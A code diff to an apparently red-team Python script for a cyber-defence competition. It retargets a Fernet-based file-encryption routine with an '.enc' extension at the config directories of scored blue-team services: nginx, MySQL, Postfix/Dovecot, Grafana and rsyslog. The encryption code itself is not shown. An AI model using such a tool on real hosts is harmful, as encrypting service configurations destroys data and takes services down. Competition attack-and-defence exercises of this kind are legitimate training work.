@@ -10,12 +10,29 @@ import argparse
 from pathlib import Path
 from cryptography.fernet import Fernet
 
-#config paths, will change once i look at boxes
+# Config paths per scored service:
+# blue1-cross-check  10.100.2.3  MCP Server  — check box for path??
+# blue1-hat-trick    10.100.2.4  Nginx
+# blue1-triple-deke  10.100.2.5  MySQL
+# blue1-toe-drag     10.100.2.6  Mail (Postfix)
+# blue1-clapper      10.100.2.7  Grafana
+# blue1-backcheck    10.100.2.8  Rsyslog
+# blue2-cross-check  10.100.3.3  MCP Server  — check box for path??
+# blue2-hat-trick    10.100.3.4  Nginx
+# blue2-triple-deke  10.100.3.5  MySQL
+# blue2-toe-drag     10.100.3.6  Mail (Postfix)
+# blue2-clapper      10.100.3.7  Grafana
+# blue2-backcheck    10.100.3.8  Rsyslog
+ 
 TARGET_DIRS = [
-    "/etc/apache2",
-    "/etc/nginx",
-    "/var/www/html",
-    "/etc/ssh",
+    "/etc/nginx",           # Nginx (hat-trick)
+    "/etc/mysql",           # MySQL (triple-deke)
+    "/etc/mysql/mysql.conf.d",
+    "/etc/postfix",         # Mail (toe-drag)
+    "/etc/dovecot",         # Mail companion if dovecot is present
+    "/etc/grafana",         # Grafana (clapper)
+    "/etc/rsyslog.d",       # Rsyslog (backcheck)
+    "/etc/rsyslog.conf",    # Rsyslog main config (backcheck)
 ]
 ENCRYPTED_EXT = ".enc"
 
